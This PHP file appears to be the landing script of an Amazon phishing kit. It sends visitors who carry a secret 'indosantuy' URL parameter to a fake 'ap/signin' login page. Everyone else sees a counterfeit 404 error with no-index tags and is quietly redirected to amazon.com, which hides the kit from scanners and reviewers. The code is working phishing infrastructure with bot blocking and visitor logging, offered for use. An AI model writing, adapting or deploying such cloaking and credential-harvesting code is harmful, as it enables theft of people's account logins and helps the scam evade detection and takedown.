<?php

@ob_start();
ini_set("output_buffering",4096);
session_start();
require_once 'inc/check_blocked.php'; 
require_once 'inc/config.php';
require_once 'inc/functions.php';

if($log_visits) {
	include_once 'inc/log.php';
}


if(!isset($_SESSION['SESSION_ID']))
{
	$_SESSION['SESSION_ID'] = uniqid(rand(10, 20), true);
}

$host = bin2hex($_SERVER['HTTP_HOST']);


if($_GET['indosantuy']){
header("Location: ap/signin?p=0&sessionid=".$host);
}else{
?>

<!DOCTYPE html>
<html>
<head>
	<title>404 Not Found</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noodp, noydir">
<meta http-equiv="refresh" content="5;url=https://href.li/?https://amazon.com">
<h1>404 Not Found</h1>
<hr>
<i>The requested URL  was not found on this server.
<br>
Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</i>

<?php
}
ob_end_flush();


?>
